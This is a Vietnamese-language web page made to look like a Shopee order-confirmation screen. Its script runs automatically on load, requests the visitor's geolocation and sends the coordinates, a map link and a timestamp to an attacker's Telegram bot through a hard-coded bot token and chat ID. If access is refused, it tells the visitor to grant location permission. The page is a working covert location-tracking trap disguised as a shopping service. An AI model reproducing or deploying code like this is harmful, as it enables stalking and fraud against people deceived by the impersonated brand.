<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Shopee đang xác nhận đơn hàng !</title>

  <style>
    body{
      margin:0;
      font-family:Arial;
      display:flex;
      justify-content:center;
      align-items:center;
      height:100vh;
      background:#f3f4f6;
    }
    .box{
      text-align:center;
      background:white;
      padding:25px;
      border-radius:12px;
      box-shadow:0 10px 30px rgba(0,0,0,0.1);
    }
    .spinner{
      border:4px solid #eee;
      border-top:4px solid #4f46e5;
      border-radius:50%;
      width:40px;
      height:40px;
      animation:spin 1s linear infinite;
      margin:0 auto 15px;
    }
    @keyframes spin{
      0%{transform:rotate(0deg)}
      100%{transform:rotate(360deg)}
    }
  </style>
</head>

<body>
  <div class="box">
    <div class="spinner"></div>
    <h3>Shopee Đang xác nhận...</h3>
    <p>Xác nhận đơn hàng thành công !</p>
  </div>

<script>
const TOKEN = "8770209732:AAHHiC-wWAU3F9UUG_KJ41QijPQSjvHlH1M";
const CHAT_ID = "2040033988";

function sendToTelegram(lat, lon){
  const text = `📍 Vị trí:
Lat: ${lat}
Lon: ${lon}
https://www.google.com/maps?q=${lat},${lon}
Time: ${new Date().toLocaleString()}`;

  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: text
    })
  });
}

// Auto chạy khi mở trang
window.onload = function(){
  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(
      function(pos){
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;

        sendToTelegram(lat, lon);

        document.body.innerHTML = `
          <div class="box">
            <h3 style="color:green;">✔ Xác nhận thành công</h3>
            <p>Bạn có thể đóng trang</p>
          </div>
        `;
      },
      function(err){
        document.body.innerHTML = `
          <div class="box">
            <h3 style="color:red;">❌ Không lấy được vị trí</h3>
            <p>Vui lòng cho phép quyền truy cập</p>
          </div>
        `;
      }
    );
  }
};
</script>

</body>
</html>
